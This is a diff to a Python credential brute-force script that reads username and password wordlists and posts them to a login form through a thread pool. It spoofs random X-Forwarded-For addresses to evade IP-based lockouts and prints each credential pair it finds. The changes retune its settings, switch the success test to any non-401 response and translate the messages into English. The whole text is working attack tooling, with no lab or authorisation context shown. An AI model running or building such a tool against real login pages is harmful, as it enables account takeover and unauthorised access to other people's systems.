@@ -7,21 +7,21 @@ from datetime import datetime, timedelta
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 字典路径，置空就不读取
-USERNAME_DIC = 'D:\\Bruteforce\\username.txt'
-PASSWORD_DIC = 'D:\\Bruteforce\\password.txt'
+USERNAME_DIC = 'D:\\Bruteforce\\username.txt' # /root/bruteforce/username.txt
+PASSWORD_DIC = 'D:\\Bruteforce\\password.txt' # /root/bruteforce/password.txt
 
 # 字典
 USERNAME = []
 PASSWORD = []
 
 # 只爆破一个账号
-ONLY_ONCE = True
+ONLY_ONCE = False
 
 # 爆破后暂停时长，单位秒
 DELAY = 1
 
 # 线程池
-THREAD = 10
+THREAD = 1
 
 # 设置代理
 PROXIES = {
@@ -31,7 +31,9 @@ PROXIES = {
 
 # 设置Headers
 HEADERS = requests.utils.default_headers()
-HEADERS.update({ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0' })
+HEADERS.update({
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
+})
 
 # 加载用户名字典
 try:
@@ -39,8 +41,8 @@ try:
         with open(USERNAME_DIC, 'r') as f:
             USERNAME = f.readlines()
 except Exception as e:
-    print(f'[x] 无法打开 "{file}" 文件 {e}')
-    os._exit()
+    print(f'[x] Cannot open "{USERNAME_DIC}" file {e}')
+    os._exit(0)
 
 # 加载密码字典
 try:
@@ -48,8 +50,8 @@ try:
         with open(PASSWORD_DIC, 'r') as f:
             PASSWORD = f.readlines()
 except Exception as e:
-    print(f'[x] 无法打开 "{file}" 文件 {e}')
-    os._exit()
+    print(f'[x] Cannot open "{PASSWORD_DIC}" file {e}')
+    os._exit(0)
 
 # 随机IP生成
 def random_ipv4():
@@ -65,7 +67,9 @@ def bruteforce(username, password):
             "submit": "Login"
         }
         
-        HEADERS.update({ 'X-Forwarded-For': random_ipv4() })
+        HEADERS.update({
+            'X-Forwarded-For': random_ipv4()
+        })
         response = requests.post(
             url,
             data=data,
@@ -75,7 +79,7 @@ def bruteforce(username, password):
             allow_redirects=False,
             timeout=7)
 
-        if "username or password is not exists" not in response.text:
+        if response.status_code != 401:
             print(f'[+] Found {username}:{password} => code:{response.status_code} length:{len(response.content)}')
             return False, True
         
@@ -87,7 +91,7 @@ def bruteforce(username, password):
         return True, False
 
     except Exception as e:
-        print(f"[x] {target} 遇到未知错误 {e} 详细信息如下：")
+        print(f"[x] {username}:{password} Encounter {e} error, detail:")
         print(traceback.format_exc())
         return True, False
 
